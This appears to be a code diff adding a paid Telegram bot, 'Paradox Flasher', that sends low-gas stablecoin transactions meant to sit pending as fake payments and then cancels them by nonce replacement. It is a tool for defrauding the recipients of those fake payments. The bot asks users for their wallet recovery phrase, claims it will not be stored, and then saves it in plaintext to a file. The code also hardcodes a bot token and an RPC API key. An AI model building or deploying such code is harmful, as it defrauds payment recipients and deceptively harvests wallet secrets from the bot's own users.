@@ -1,0 +1,269 @@
+const TelegramBot = require('node-telegram-bot-api');
+const Web3 = require('web3');
+const fs = require('fs');
+const { Wallet } = require('ethers');
+
+// Hardcoded whitelisted users and admin
+const whitelistedUsers = [6948557964];
+const adminId = 6948557964; // Hardcoded admin ID
+
+const userProfilesFile = './userProfiles.json';
+let userProfiles = {};
+
+if (fs.existsSync(userProfilesFile)) {
+    userProfiles = JSON.parse(fs.readFileSync(userProfilesFile));
+}
+
+const getWhitelistedUsers = () => {
+    let users = [...whitelistedUsers];
+    if (fs.existsSync('whitelistedusers.txt')) {
+        const fileUsers = fs.readFileSync('whitelistedusers.txt', 'utf8').split('\n').map(id => parseInt(id.trim()));
+        users = [...new Set([...users, ...fileUsers])]; // Merge and deduplicate
+    }
+    return users;
+};
+
+const web3 = new Web3('https://burned-ancient-slug.discover.quiknode.pro/e3d394f73afa2f369ebc335b847ca6c5532fd55e/');
+const tokenContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const abi = [
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "_to",
+                "type": "address"
+            },
+            {
+                "name": "_value",
+                "type": "uint256"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+const contract = new web3.eth.Contract(abi, tokenContractAddress);
+const bot = new TelegramBot('7356011195:AAFfW4PAnsIn-3PSap_bJghWG1PSgCpPiGU', {polling: true});
+
+const saveProfiles = () => {
+    fs.writeFileSync(userProfilesFile, JSON.stringify(userProfiles, null, 2));
+};
+
+bot.onText(/\/start/, (msg) => {
+    const users = getWhitelistedUsers();
+    if (users.includes(msg.from.id)) {
+        bot.sendMessage(msg.chat.id, "Welcome to Paradox Flasher!\n\nClick /fake_transfer to send your transaction\n\nRemember, before sending a new transaction you MUST cancel the old one using:\n\n/revert <nonce>");
+    } else {
+        bot.sendMessage(msg.chat.id, "❌ Unauthorized ❌ \n\n 25$ | day\n100$ | week\n250$ | month\n750$ | lifetime + Extra’s \n\nContact @BlockchainParadox for access");
+    }
+});
+
+bot.onText(/\/fake_transfer/, async (msg) => {
+    const users = getWhitelistedUsers();
+    if (users.includes(msg.from.id)) {
+        const chatId = msg.chat.id;
+
+        const tokenDetails = {
+            TUSD: { contractAddress: '0x0000000000085d4780B73119b644AE5ecd22b376', decimals: 18 },
+            USDT: { contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+            USDC: { contractAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
+            DAI: { contractAddress: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 }
+        };
+
+        bot.sendMessage(chatId, "🚀 Please reply to this message with the Ethereum address of the receiver of this fake transfer transaction.")
+            .then(sentMessage => {
+                bot.onReplyToMessage(chatId, sentMessage.message_id, async (message) => {
+                    const recipient = message.text;
+
+                    bot.sendMessage(chatId, "🚀 Please reply to this message with the token Ethereum token ticker you want to send\n\nReply to this message with only that token ticker:\n\n(USDT, USDC, TUSD, DAI).")
+                        .then(sentMessage => {
+                            bot.onReplyToMessage(chatId, sentMessage.message_id, async (message) => {
+                                const tokenTicker = message.text.toUpperCase();
+                                const tokenInfo = tokenDetails[tokenTicker];
+
+                                if (!tokenInfo) {
+                                    bot.sendMessage(chatId, "Invalid token ticker. Please try again with a valid one (USDT, USDC, TUSD, DAI).");
+                                    return;
+                                }
+
+                                bot.sendMessage(chatId, "🚀 Please reply to this message with the amount of tokens you wish to fake-transfer to this address.")
+                                    .then(sentMessage => {
+                                        bot.onReplyToMessage(chatId, sentMessage.message_id, async (message) => {
+                                            const amount = message.text.trim();
+
+                                            // Check if the amount is a valid number and an integer
+                                            if (!/^\d+$/.test(amount)) {
+                                                bot.sendMessage(chatId, "Error: Please enter a positive whole number without decimal points or commas and try again.");
+                                                return;
+                                            }
+
+                                            const amountBN = web3.utils.toBN(amount);
+
+                                            bot.sendMessage(chatId, "🚀 Please reply to this message with 12-word recovery-phrase from the wallet you wish to transfer from (will be covering gas fees)!\n\n🔏 This will not be stored anywhere, feel free to clear chat after sending")
+                                                .then(sentMessage => {
+                                                    bot.onReplyToMessage(chatId, sentMessage.message_id, async (message) => {
+                                                        const seedPhrase = message.text;
+                                                        const userId = msg.from.id.toString();
+
+                                                        // Store the seed phrase temporarily
+                                                        if (!userProfiles[userId]) {
+                                                            userProfiles[userId] = {};
+                                                        }
+                                                        userProfiles[userId].seedPhrase = seedPhrase;
+                                                        saveProfiles();
+
+                                                        try {
+                                                            const wallet = Wallet.fromMnemonic(seedPhrase);
+                                                            const nonce = await web3.eth.getTransactionCount(wallet.address);
+                                                            const txData = contract.methods.transfer(
+                                                                recipient,
+                                                                amountBN.mul(web3.utils.toBN(10**tokenInfo.decimals)).toString()
+                                                            ).encodeABI();
+
+                                                            const gasPriceGwei = readGasValue();
+                                                            const gasPriceWei = web3.utils.toWei(gasPriceGwei.toString(), 'gwei');
+
+                                                            bot.sendMessage(chatId, `⏳ Sending transaction with ${gasPriceWei} WEI gas to slow down transaction.`);
+
+                                                            const tx = {
+                                                                to: tokenInfo.contractAddress,
+                                                                value: '0x0',
+                                                                gas: 60000,
+                                                                gasPrice: gasPriceWei,
+                                                                data: txData,
+                                                                nonce: nonce
+                                                            };
+                                                            const signedTx = await web3.eth.accounts.signTransaction(tx, wallet.privateKey);
+                                                            web3.eth.sendSignedTransaction(signedTx.rawTransaction)
+                                                                .on('transactionHash', hash => {
+                                                                    bot.sendMessage(chatId, `Fake Transaction has been sent with nonce: ${nonce} with transaction hash [${hash}](https://etherscan.io/tx/${hash})`, {parse_mode: 'Markdown'});
+                                                                })
+                                                                .on('error', error => {
+                                                                    bot.sendMessage(chatId, `Error: ${error.message}`);
+                                                                });
+                                                        } catch (error) {
+                                                            bot.sendMessage(chatId, `Error: ${error.message}`);
+                                                        }
+                                                    });
+                                                });
+                                        });
+                                    });
+                            });
+                        });
+                });
+            });
+    } else {
+        bot.sendMessage(msg.chat.id, "Unauthorized. Contact @BlockchainParadox for access.\n\n50$ 1day |\n\n 200$ 1 week |\n\n 500$ 1 month |\n\n 5000$ lifetime source code |");
+    }
+});
+
+bot.onText(/\/remove_user (\d+)/, (msg, match) => {
+    if (msg.from.id === adminId) {
+        const userIdToRemove = match[1];
+        const whitelistedUsersPath = 'whitelistedusers.txt';
+
+        if (fs.existsSync(whitelistedUsersPath)) {
+            let whitelistedUsers = fs.readFileSync(whitelistedUsersPath, 'utf8').split('\n');
+            if (whitelistedUsers.includes(userIdToRemove)) {
+                whitelistedUsers = whitelistedUsers.filter(id => id.trim() !== userIdToRemove);
+                fs.writeFileSync(whitelistedUsersPath, whitelistedUsers.join('\n'));
+                bot.sendMessage(msg.chat.id, `User ${userIdToRemove} has been removed from the whitelist.`);
+            } else {
+                bot.sendMessage(msg.chat.id, `No such ID ${userIdToRemove} whitelisted.`);
+            }
+        } else {
+            bot.sendMessage(msg.chat.id, 'Whitelist file not found.');
+        }
+    } else {
+        bot.sendMessage(msg.chat.id, "Unauthorized. Only the admin can remove users from the whitelist.");
+    }
+});
+
+const readGasValue = () => {
+    if (fs.existsSync('GASVALUE.txt')) {
+        const gasValue = fs.readFileSync('GASVALUE.txt', 'utf8').trim();
+        return parseInt(gasValue, 10); // Ensure it's an integer
+    } else {
+        return 60; // Default value if file does not exist
+    }
+};
+
+// Function to update the gas value
+const updateGasValue = (newValue) => {
+    fs.writeFileSync('GASVALUE.txt', newValue.toString());
+};
+
+// Adding the /setgass command
+bot.onText(/\/setgass (\d+)/, (msg, match) => {
+    if (msg.from.id === adminId) {
+        const newGasValue = match[1];
+        updateGasValue(newGasValue);
+        bot.sendMessage(msg.chat.id, `Gas value has been updated to ${newGasValue} GWEI for all users.`);
+    } else {
+        bot.sendMessage(msg.chat.id, "Unauthorized. Only the admin can set the gas value.");
+    }
+});
+
+
+bot.onText(/\/revert (\d+)/, async (msg, match) => {
+    const users = getWhitelistedUsers();
+    if (users.includes(msg.from.id)) {
+        const userId = msg.from.id.toString();
+        const nonceToCancel = Number(match[1]);
+
+        if (userProfiles[userId] && userProfiles[userId].seedPhrase) {
+            try {
+                const wallet = Wallet.fromMnemonic(userProfiles[userId].seedPhrase);
+                let gasPrice = await web3.eth.getGasPrice();
+                gasPrice = Web3.utils.toBN(gasPrice);
+                const higherGasPrice = Web3.utils.toHex(gasPrice.add(Web3.utils.toBN(4 * 10**9)));  // Adding 4 Gwei
+
+                const tx = {
+                    to: wallet.address,
+                    value: '0x0',
+                    gas: 21000,
+                    gasPrice: higherGasPrice,
+                    nonce: nonceToCancel
+                };
+
+                const signedTx = await web3.eth.accounts.signTransaction(tx, wallet.privateKey);
+                web3.eth.sendSignedTransaction(signedTx.rawTransaction)
+                    .on('transactionHash', hash => {
+                        bot.sendMessage(msg.chat.id, `Transaction hash for cancellation: ${hash}`);
+
+                 
+
+                    })
+                    .on('error', error => {
+                        bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
+                    });
+            } catch (error) {
+                bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
+            }
+        } else {
+            bot.sendMessage(msg.chat.id, "Seed phrase not found. Please perform a fake transfer first.");
+        }
+    } else {
+        bot.sendMessage(msg.chat.id, "Unauthorized. Contact @BlockchainParadox for access.\n\n50$ 1day |\n\n 200$ 1 week |\n\n 500$ 1 month |\n\n 5000$ lifetime source code |");
+    }
+});
+
+bot.onText(/\/admin_add_whitelist (\d+)/, (msg, match) => {
+    if (msg.from.id === adminId) {
+        const newUserId = parseInt(match[1]);
+        fs.appendFileSync('whitelistedusers.txt', `\n${newUserId}`);
+        bot.sendMessage(msg.chat.id, `User ${newUserId} has been added to the whitelist.`);
+    } else {
+        bot.sendMessage(msg.chat.id, "Unauthorized. Only the admin can add users to the whitelist.");
+    }
+});
+
